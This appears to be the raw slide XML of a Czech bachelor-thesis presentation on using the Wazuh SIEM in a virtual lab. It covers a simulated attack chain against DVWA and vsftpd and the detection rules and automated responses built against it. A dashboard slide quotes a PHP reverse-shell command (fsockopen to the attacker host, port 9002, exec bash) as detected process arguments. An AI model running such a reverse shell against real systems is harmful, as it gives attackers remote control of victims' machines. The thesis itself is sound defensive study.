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Představení tématu: open-source SIEM platforma Wazuh nasazená v izolované virtuální laboratoři. Práci hodnotím z pohledu útočníka i obránce — postavím zranitelnou síť, provedu reálný útok a poté nasadím detekční pravidla a automatizované reakce.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Prezentace má tři části: teorie (zhruba třetina), praktická realizace útoku v laboratoři a nakonec obranná opatření postavená na získaných indikátorech kompromitace.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SIEM je centrální systém kyberbezpečnosti. Klíčové jsou tvorba detekčních pravidel a korelace — kombinace více zdánlivě neškodných událostí. Správná korelace snižuje počet false positives. Po detekci může systém reagovat automaticky.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Čtyři hlavní komponenty. Agent sbírá data na koncovém zařízení, Server je analyzuje (dekodéry rozpoznají typ logu, rules engine porovná s IoC), Indexer postavený na OpenSearch je ukládá a Dashboard zpřístupňuje. Doporučená sestava all-in-one: 4 jádra, ideálně 16 GB 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Pět virtuálních strojů. SIEM uzel hostí všechny tři centrální komponenty. Dva žluté servery jsou monitorované cíle se záměrnými zranitelnostmi — DVWA a starý vsftpd s backdoorem. Kali je útočník. Sběr zajišťuje Suricata (síť) a auditd (procesy a příkazy).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Plochá topologie /24. Chráněná infrastruktura má statické adresy .120–.122, útočník .224. Modrý uzel je SIEM, žluté jsou monitorované cíle, červený je Kali. Vše propojeno přes virtuální síť KVM na hostiteli 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 dynamickou laboratoř, kterou je nutné často vracet do čistého stavu, je kombinace orchestrace (Ansible) a snapshotů nezbytná. Ansible zajistí opakovatelné nasazení přes role, snapshoty rychlý návrat po kompromitaci.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Cílová infrastruktura simuluje reálné zranitelnosti. Útočník je fiktivní APT skupina s konkrétními TTP podle MITRE ATT&amp;CK. Cíle: přístup, persistence, eskalace, exfiltrace a ransomware.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Útok ve čtyřech fázích podle životního cyklu. Průzkum (Nmap, Gobuster) zachytí Suricata. Prvotní přístup přes DVWA — brute force, SQLi, webshell, reverse shell. Eskalace přes SSH klíč a root. Naplnění cílů: exfiltrace a ransomware s příponou .vspjlock.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Wazuh nabízí více pohledů na dohledání IoC. Threat Hunting filtruje podle IP, závažnosti a ID pravidla. FIM přidává hashe souborů. View surrounding documents umožní časovou korelaci. Modul IT Hygiene odhalil aktivní PHP spojení reverse shellu na port 9002.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Celá řetěz útoku v jedné ose: od skenu po ransomware. I když útočník na konci maže lokální logy, Wazuh má vše uloženo centrálně na manageru — analytik z historických dat extrahuje IoC. Tyto indikátory jsou základem pro obranná pravidla v další části.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 IoC vznikla vrstvená obrana. Blokace IP přes firewall-drop, odstranění malwaru porovnáním hashů z CDB databáze a detekce reverse shellu kombinací auditd a Suricata s ukončením procesu. V laboratoři je citlivost pravidel vyšší kvůli demonstraci.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Útočník zajišťoval persistenci vložením svého klíče do authorized_keys. Self-healing: FIM detekuje změnu (pravidlo 550), Active Response spustí restore-key.sh, který soubor obnoví z bezpečné zálohy a opraví práva. Sekundární pravidlo 100300 ohlásí obnovu v dashboardu. V testu byl skript cílený na účet joe; v produkci by pokrýval všechny uživatele.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Forenzní rekonstrukce z IoC: centrální logy přežily mazání. Opakovaná změna klíče napovídala automatizaci. Analýza crontabu uživatele joe odhalila zálohovací skript s world-writable právy, do kterého útočník vložil zápis svého klíče. Poučení: hlídat integritu i u skriptů, ne jen u koncových souborů.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Shrnutí. Wazuh úspěšně zachytil brute force, skeny i upload webshellu; vrstvená obrana s Active Response zastavila více fází. Limitace: modifikovaný hash obejde FIM, méně invazivní skeny jsou hůře detekovatelné. Budoucí směr: VirusTotal, honeypoty, vlastní dekodéry, strojové učení.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152A4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743200"/>
            <a:ext cx="3840480" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="152A45"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2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1B335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42816" y="859536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965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BAKALÁŘSKÁ PRÁCE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22860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Využití platformy Wazuh pro SIEM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="33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 virtuálním prostředí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914400" y="35295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Nasazení open-source SIEM, simulace reálného útoku a automatizovaná obrana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108960" y="4069080"/>
            <a:ext cx="292608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4206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Autor:  Zdeněk Frydrýn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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Vedoucí práce:  Mgr. Antonín Přibyl</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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VŠPJ Jihlava  ·  Aplikovaná informatika  · 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 PREZENTACE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Obsah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80467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673352"/>
            <a:ext cx="548640" cy="548640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1815998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6420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2148840" y="1627632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Teoretická část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2148840" y="1938528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je SIEM a jeho role v kyberbezpečnosti; architektura a komponenty platformy Wazuh.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578608"/>
            <a:ext cx="80467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41248" y="2770632"/>
            <a:ext cx="548640" cy="548640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894" y="2913278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276148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2148840" y="2724912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Praktická část — laboratoř a útok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2148840" y="3035808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Virtuální laboratoř, scénáře útoku po jednotlivých fázích a dohledání IoC ve Wazuh.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3675888"/>
            <a:ext cx="80467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1248" y="3867912"/>
            <a:ext cx="548640" cy="548640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94" y="4010558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385876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2148840" y="3822192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Ochranná opatření a hardening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2148840" y="4133088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Detekční pravidla z IoC, self-healing přes Active Response a forenzní analýza.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280160"/>
            <a:ext cx="4206240" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="152A45"/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2926080"/>
            <a:ext cx="2743200" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B3354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554480"/>
            <a:ext cx="914400" cy="9144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17922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640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874520" y="17007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PRVNÍ ČÁST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847088" y="19659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Teoretická část</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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TEORETICKÁ ČÁST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je SIEM a jeho role v kyberbezpečnosti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794760" cy="3246120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2254"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1A2B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91640"/>
            <a:ext cx="640080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B335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18580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70078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Information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Event Management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2487168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Centralizovaně sbírá, koreluje a vyhodnocuje bezpečnostní události z celé IT infrastruktury — serverů, síťových prvků, aplikací i bezpečnostních nástrojů.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36118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Logy na jednotlivých systémech rotují a brzy mizí — SIEM zajišťuje jejich trvalou archivaci a možnost zpětné analýzy pro SOC.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26280" y="1417320"/>
            <a:ext cx="4069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36592" y="1581912"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F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954" y="1691274"/>
            <a:ext cx="201900" cy="2019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85232" y="1536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Viditelnost nad děním v síti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285232" y="180136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Souhrnný přehled o aktivitě napříč zdroji v reálném čase.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26280" y="2240280"/>
            <a:ext cx="4069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36592" y="2404872"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F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954" y="2514234"/>
            <a:ext cx="201900" cy="2019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85232" y="23591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Detekce anomálií a hrozeb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5285232" y="262432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Detekční pravidla odliší běžné chování od podezřelého vzorce.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526280" y="3063240"/>
            <a:ext cx="4069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36592" y="3227832"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F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5954" y="3337194"/>
            <a:ext cx="201900" cy="2019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85232" y="3182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Korelace více událostí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5285232" y="344728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Jednotlivě neškodné události tvoří v souhrnu útočný vzorec.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526280" y="3886200"/>
            <a:ext cx="4069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736592" y="4050792"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F8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5954" y="4160154"/>
            <a:ext cx="201900" cy="2019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85232" y="4005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Automatizovaná reakce (SOAR)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5285232" y="427024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Upozornění, izolace zařízení nebo předání incidentu k řešení.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TEORETICKÁ ČÁST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Architektura a komponenty platformy Wazuh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938528" cy="2148840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25296" y="1755648"/>
            <a:ext cx="585216" cy="585216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7452" y="1907804"/>
            <a:ext cx="280904" cy="280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423160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94944" y="2761488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Běží na koncovém zařízení. Sbírá logy, hlídá integritu souborů (FIM) a provádí Active Response.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2505456" y="2628900"/>
            <a:ext cx="128016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651760" y="1554480"/>
            <a:ext cx="1938528" cy="2148840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28416" y="1755648"/>
            <a:ext cx="585216" cy="585216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0572" y="1907804"/>
            <a:ext cx="280904" cy="2809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51760" y="2423160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2798064" y="2761488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s analytickým modulem: dekóduje události, aplikuje pravidla a generuje alerty.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4608576" y="2628900"/>
            <a:ext cx="128016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4754880" y="1554480"/>
            <a:ext cx="1938528" cy="2148840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31536" y="1755648"/>
            <a:ext cx="585216" cy="585216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3692" y="1907804"/>
            <a:ext cx="280904" cy="2809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54880" y="2423160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Indexer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4901184" y="2761488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Ukládá a indexuje data (OpenSearch). Umožňuje rychlé full-textové vyhledávání a agregace.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6711696" y="2628900"/>
            <a:ext cx="128016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6858000" y="1554480"/>
            <a:ext cx="1938528" cy="2148840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534656" y="1755648"/>
            <a:ext cx="585216" cy="585216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812" y="1907804"/>
            <a:ext cx="280904" cy="28090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58000" y="2423160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7004304" y="2761488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Webové rozhraní pro vizualizaci, threat hunting, správu agentů a ladění pravidel.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3950208"/>
            <a:ext cx="8046720" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8537"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1A2B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="3950208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Datový tok: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→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(TCP/1514, AES) →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(dekódování + pravidla) →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Filebeat →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Indexer (TLS/9200) → </a:t>
            </a:r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280160"/>
            <a:ext cx="4206240" cy="4206240"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="152A45"/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2926080"/>
            <a:ext cx="2743200" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B3354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554480"/>
            <a:ext cx="914400" cy="9144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17922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640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874520" y="17007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DRUHÁ ČÁST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847088" y="19659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Praktická část — laboratoř a simulace útoku</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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PRAKTICKÁ ČÁST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Infrastruktura virtuální laboratoře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Prostředí KVM/QEMU na hostiteli s Ubuntu Server 24.04 (64 GB RAM, 12 jader). Architektura Wazuh „all-in-one“ je pro 4 současně běžící stroje plně dostačující.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83664"/>
          <a:ext cx="804672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417320"/>
                <a:gridCol w="1417320"/>
                <a:gridCol w="178308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Komponenta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 / CPU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adresa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Hostitel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 24.04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GB / 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192.168.122.1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Fyzický hostitel, virtuální síť KVM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SIEM (Wazuh)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 24.04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GB / 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192.168.122.120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 + Indexer + Dashboard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 24.04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GB /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192.168.122.121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Cíl: Apache + DVWA, Wazuh agent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 24.04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GB /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192.168.122.122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Cíl: vsftpd 2.3.4, Wazuh agent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Útočník (Kali)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Kali Linux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GB / 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192.168.122.224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Team — simulace útoků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PRAKTICKÁ ČÁST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Síťová topologie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749040" y="1371600"/>
            <a:ext cx="1645920" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9677"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1A2B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749040" y="137160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
</a:t>
            </a:r>
            <a:pPr algn="ctr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192.168.122.1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7406640" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F8"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="14B8A6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68680" y="244144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Virtuální síť KVM   ·   192.168.122.0/24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938528"/>
            <a:ext cx="0" cy="39319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2788920"/>
            <a:ext cx="32461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5875">
            <a:solidFill>
              <a:srgbClr val="14B8A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07592" y="2990088"/>
            <a:ext cx="438912" cy="438912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1709" y="3104205"/>
            <a:ext cx="210678" cy="21067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856232" y="29169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 Ubuntu-blue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856232" y="320954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192.168.122.120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0" y="2788920"/>
            <a:ext cx="32461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5875">
            <a:solidFill>
              <a:srgbClr val="EF444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919472" y="2990088"/>
            <a:ext cx="438912" cy="438912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3589" y="3104205"/>
            <a:ext cx="210678" cy="21067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68112" y="29169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Red — útočník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468112" y="320954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192.168.122.224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1143000" y="3703320"/>
            <a:ext cx="32461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5875">
            <a:solidFill>
              <a:srgbClr val="F59E0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1307592" y="3904488"/>
            <a:ext cx="438912" cy="438912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709" y="4018605"/>
            <a:ext cx="210678" cy="21067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856232" y="38313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 Ubuntu-yellow-1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856232" y="412394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192.168.122.121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754880" y="3703320"/>
            <a:ext cx="32461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5875">
            <a:solidFill>
              <a:srgbClr val="F59E0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919472" y="3904488"/>
            <a:ext cx="438912" cy="438912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3589" y="4018605"/>
            <a:ext cx="210678" cy="21067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468112" y="38313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 Ubuntu-yellow-2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468112" y="412394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192.168.122.122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548640" y="47365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Sběr dat:  Suricata (IDS, síťový provoz)  +  Auditd (procesy a příkazy)  →  Wazuh agent  →  SIEM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PRAKTICKÁ ČÁST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Automatizace: Ansible a snapshoty KVM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719072"/>
            <a:ext cx="658368" cy="658368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424" y="1890248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27632" y="179222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— orchestrace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514600"/>
            <a:ext cx="3383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Deklarativní stav infrastruktury v YAML playboocích, komunikace přes SSH.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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Logické celky rozdělené do rolí: install-dvwa, deploy-suricata, wazuh-install, wazuh-agents…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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Reprodukovatelnost — celé prostředí lze postavit znovu jediným spuštěním.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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Vývoj a ladění playbooků byly časově nejnáročnější fází; efektivnější a čistší než sekvenční Bash skripty.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46304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56048" y="1719072"/>
            <a:ext cx="658368" cy="658368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7224" y="1890248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42432" y="179222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Snapshoty v KVM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983480" y="2514600"/>
            <a:ext cx="3383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Uloží kompletní stav stroje — disk i operační paměť — v konkrétním čase.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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každém testovacím cyklu lze prostředí okamžitě vrátit do výchozího stavu.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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Odpadá zdlouhavá reinstalace a opětovná konfigurace po kompromitaci stroje.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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Spolu s orchestrací nezbytný základ pro konzistentní a opakovatelné experimenty.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PRAKTICKÁ ČÁST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Testovací scénáře — zranitelnosti a cíle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ZÁMĚRNÉ ZRANITELNOSTI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023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837944"/>
            <a:ext cx="365760" cy="36576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18" y="1933042"/>
            <a:ext cx="175565" cy="1755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07008" y="17830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DVWA na Apache (Server 1)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207008" y="20391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Zranitelnosti aplikační vrstvy: SQLi, upload, brute force.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548640" y="2441448"/>
            <a:ext cx="4023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1520" y="2587752"/>
            <a:ext cx="365760" cy="36576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618" y="2682850"/>
            <a:ext cx="175565" cy="17556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07008" y="253288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vsftpd 2.3.4 (Server 2)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207008" y="27889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Známá zranitelnost typu backdoor.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3191256"/>
            <a:ext cx="4023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1520" y="3337560"/>
            <a:ext cx="365760" cy="36576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8" y="3432658"/>
            <a:ext cx="175565" cy="17556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07008" y="328269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Chybný /etc/sudoers (účet john)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207008" y="35387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NOPASSWD — spouštění příkazů jako root bez hesla.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3941064"/>
            <a:ext cx="4023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31520" y="4087368"/>
            <a:ext cx="365760" cy="36576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18" y="4182466"/>
            <a:ext cx="175565" cy="17556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07008" y="403250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Slabá hygiena přístupů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207008" y="42885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klíče, world-writable cron skript pro persistenci.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="1371600"/>
            <a:ext cx="3794760" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2222"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1A2B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074920" y="1627632"/>
            <a:ext cx="548640" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B3354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7566" y="1770278"/>
            <a:ext cx="263347" cy="26334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715000" y="16642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Cíle útočníka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5074920" y="2249424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Roli hraje fiktivní APT skupina s definovanou sadou TTP (taktiky, techniky, postupy) mapovanou na MITRE ATT&amp;CK.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5120640" y="297180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Získání počátečního přístupu do sítě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Udržení přístupu (persistence)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Eskalace oprávnění až na root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Exfiltrace citlivých dat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Nasazení ransomwaru a zametání stop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PRAKTICKÁ ČÁST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Fáze útoku — od průzkumu po naplnění cílů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938528" cy="3200400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94944" y="1645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810512" y="1664208"/>
            <a:ext cx="512064" cy="512064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3649" y="1797345"/>
            <a:ext cx="245791" cy="2457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4944" y="2139696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Průzkum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13232" y="2724912"/>
            <a:ext cx="16276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— sken portů (80, 22)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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Gobuster — enumerace adresářů</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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Detekce: Suricata + pravidla 400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2505456" y="1901952"/>
            <a:ext cx="128016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651760" y="1481328"/>
            <a:ext cx="1938528" cy="3200400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798064" y="1645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3913632" y="1664208"/>
            <a:ext cx="512064" cy="512064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769" y="1797345"/>
            <a:ext cx="245791" cy="24579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98064" y="2139696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Prvotní přístup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2816352" y="2724912"/>
            <a:ext cx="16276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+ SQLi na DVWA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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webshellu (RCE)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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shell přes PHP (port 9002)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4608576" y="1901952"/>
            <a:ext cx="128016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4754880" y="1481328"/>
            <a:ext cx="1938528" cy="3200400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4901184" y="1645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6016752" y="1664208"/>
            <a:ext cx="512064" cy="512064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889" y="1797345"/>
            <a:ext cx="245791" cy="24579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901184" y="2139696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Eskalace a persistence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4919472" y="2724912"/>
            <a:ext cx="16276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Vložení SSH klíče do authorized_keys</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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Přechod na účet root</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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SUID / cron / hardcoded údaje</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6711696" y="1901952"/>
            <a:ext cx="128016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6858000" y="1481328"/>
            <a:ext cx="1938528" cy="3200400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7004304" y="1645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Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8119872" y="1664208"/>
            <a:ext cx="512064" cy="512064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3009" y="1797345"/>
            <a:ext cx="245791" cy="245791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004304" y="2139696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Naplnění cílů</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7022592" y="2724912"/>
            <a:ext cx="16276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Exfiltrace smernice_bp.pdf (port 8000)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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Nasazení ransomware.py → .vspjlock</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1030" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-3429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Zametání stop (anti-forensics)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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PRAKTICKÁ ČÁST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Dohledání IoC ve Wazuh dashboardu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45920"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4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170" y="1755282"/>
            <a:ext cx="201900" cy="201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15819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Hunting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98448" y="184708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Tabulkové výpisy a grafy: zdrojová IP, rule.level a rule.id, časové okno.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2304288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" y="2468880"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F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170" y="2578242"/>
            <a:ext cx="201900" cy="201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98448" y="24048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— hashe souborů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298448" y="267004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nově vytvořených souborů SHA-1 a SHA-256 pro identifikaci malwaru.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127248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3291840"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F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170" y="3401202"/>
            <a:ext cx="201900" cy="201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98448" y="32278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surrounding documents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298448" y="349300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Časová korelace souvisejících událostí — rekonstrukce sledu kroků.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950208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4114800"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF4F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170" y="4224162"/>
            <a:ext cx="201900" cy="201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98448" y="40507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IT Hygiene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298448" y="431596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Běžící procesy a aktivní spojení — odhalil PHP reverse shell na .224:9002.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846320" y="1481328"/>
            <a:ext cx="3749040" cy="3127248"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1754"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1A2B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029200" y="164592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6" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5193792" y="164592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Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5358384" y="1645920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8" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5532120" y="159105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Details — reverse shell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5074920" y="1938528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agent.name      </a:t>
            </a:r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ubuntu-server-1
</a:t>
            </a:r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rule.signature  </a:t>
            </a:r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 HUNTING Whoami
</a:t>
            </a:r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data.dest_ip    </a:t>
            </a:r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192.168.122.224
</a:t>
            </a:r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data.dest_port  </a:t>
            </a:r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9002
</a:t>
            </a:r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process.name    </a:t>
            </a:r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
</a:t>
            </a:r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process.args    </a:t>
            </a:r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fsockopen(
  "192.168.122.224",9002);
  exec("bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3")
</a:t>
            </a:r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syscheck.sha256 </a:t>
            </a:r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d47f2c69…80f0928b</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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PRAKTICKÁ ČÁST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Rekapitulace průběhu incidentu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78638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9496" y="2139696"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14B8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1581912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algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="96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sken</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="960" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1522476" y="2139696"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14B8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2980" y="2404872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algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="96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Gobuster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2505456" y="2139696"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF444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1581912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algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="96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3488436" y="2139696"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF444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48940" y="2404872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algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="96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4471416" y="2139696"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF444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1581912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algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="96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Webshell / RCE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5454396" y="2139696"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
